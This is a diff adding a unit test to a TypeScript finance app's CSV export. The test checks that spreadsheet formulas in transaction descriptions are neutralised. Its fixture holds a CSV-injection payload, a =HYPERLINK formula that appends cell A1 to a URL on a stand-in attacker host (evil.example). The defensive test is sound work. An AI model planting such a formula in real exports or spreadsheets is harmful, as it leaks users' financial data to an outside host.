@@ -17,7 +17,9 @@ import type {
   Category,
   Transaction,
 } from "@sergeant/finyk-domain/domain/types";
+import { arrayToCSV } from "@shared/lib/ui/export";
 import {
+  COLUMNS,
   toCsvRows,
   csvFilename,
   csvRangeFilename,
@@ -115,6 +117,31 @@ describe("exportTransactionsCsv", () => {
 
     expect(rows[0]?.date).toBe("2026-09-23");
     expect(rows[0]?.time).toBe("");
+  });
+
+  // sec-30: опис задає мерчант, чек чи виписка, тож `=HYPERLINK(...)` в
+  // описі не має доїхати до Excel формулою. А відʼємна сума має лишитись
+  // числом: префікс `'` зробив би з витрати текст.
+  it("знешкоджує формулу в описі, але не чіпає відʼємну суму", () => {
+    const csv = arrayToCSV(
+      toCsvRows(
+        [
+          tx({
+            description: '=HYPERLINK("https://evil.example/?d="&A1,"Сільпо")',
+            amount: -12345,
+          }),
+          tx({ id: "t2", description: "@SUM(A1:A9)", amount: 5000 }),
+        ],
+        () => cat("Їжа"),
+      ),
+      COLUMNS,
+    );
+    const lines = csv.split("\n");
+
+    expect(lines[1]).toContain(
+      `"'=HYPERLINK(""https://evil.example/?d=""&A1,""Сільпо"")",-123.45,`,
+    );
+    expect(lines[2]).toContain(",'@SUM(A1:A9),50.00,");
   });
 
   it("називає файл місяцем, який експортували", () => {
